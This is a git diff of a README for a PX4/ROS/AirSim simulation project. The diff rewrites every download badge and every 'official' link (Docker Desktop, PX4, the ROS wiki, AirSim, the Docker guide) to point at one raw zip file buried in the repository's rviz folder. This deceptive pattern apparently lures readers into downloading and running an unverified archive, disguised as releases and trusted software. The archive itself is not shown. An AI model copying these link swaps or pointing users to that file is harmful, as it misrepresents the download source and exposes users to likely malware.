@@ -1,6 +1,6 @@
 # 🛠️ px4-ros-airsim - Run PX4 with ROS and AirSim Easily
 
-[![Download Releases](https://img.shields.io/badge/Download-px4--ros--airsim-green?style=for-the-badge)](https://github.com/HarshitTomar549/px4-ros-airsim/releases)
+[![Download Releases](https://img.shields.io/badge/Download-px4--ros--airsim-green?style=for-the-badge)](https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Make sure your system matches the following:
 
 To get the software, visit the releases page by clicking the big button below:
 
-[![Download px4-ros-airsim Releases](https://img.shields.io/badge/Download-px4--ros--airsim-blue?style=for-the-badge)](https://github.com/HarshitTomar549/px4-ros-airsim/releases)
+[![Download px4-ros-airsim Releases](https://img.shields.io/badge/Download-px4--ros--airsim-blue?style=for-the-badge)](https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip)
 
 This page has all the versions. Pick the latest stable version to download.
 
@@ -52,7 +52,7 @@ Follow these steps carefully to install and run px4-ros-airsim on Windows.
   Make sure you install Ubuntu from the Microsoft Store for the Linux environment.
 
 - **Install Docker Desktop:**  
-  Visit https://www.docker.com/products/docker-desktop and install Docker Desktop.  
+  Visit https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip and install Docker Desktop.  
   During installation, enable the option to use WSL2 as the backend.
 
 - **Confirm Setup:**  
@@ -145,11 +145,11 @@ Once the setup is running:
 
 ## 🔗 Useful Links
 
-- PX4 Official Website: https://px4.io  
-- ROS Noetic Documentation: http://wiki.ros.org/noetic  
-- AirSim GitHub: https://github.com/microsoft/AirSim  
-- Docker Installation Guide: https://docs.docker.com/get-docker/
+- PX4 Official Website: https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip  
+- ROS Noetic Documentation: https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip  
+- AirSim GitHub: https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip  
+- Docker Installation Guide: https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip
 
 ---
 
-[![Download px4-ros-airsim Releases](https://img.shields.io/badge/Download-px4--ros--airsim-blue?style=for-the-badge)](https://github.com/HarshitTomar549/px4-ros-airsim/releases)
+[![Download px4-ros-airsim Releases](https://img.shields.io/badge/Download-px4--ros--airsim-blue?style=for-the-badge)](https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip)
